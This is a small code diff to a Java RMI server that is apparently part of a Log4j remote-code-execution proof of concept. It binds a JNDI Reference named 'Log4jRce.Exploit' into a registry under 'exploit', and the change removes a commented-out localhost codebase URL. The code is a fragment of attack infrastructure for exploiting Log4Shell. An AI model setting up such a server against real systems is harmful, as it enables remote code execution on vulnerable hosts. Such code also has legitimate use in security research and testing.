@@ -22,7 +22,7 @@ public class RmiServer extends UnicastRemoteObject {
 //        registry.bind("server", new RmiServer());
 
         Reference reference = new Reference("Log4jRce.Exploit",
-                "Log4jRce.Exploit", null);  // "http://127.0.0.1:10088"
+                "Log4jRce.Exploit", null);
         ReferenceWrapper wrapper = new ReferenceWrapper(reference);
         registry.bind("exploit", wrapper);
 
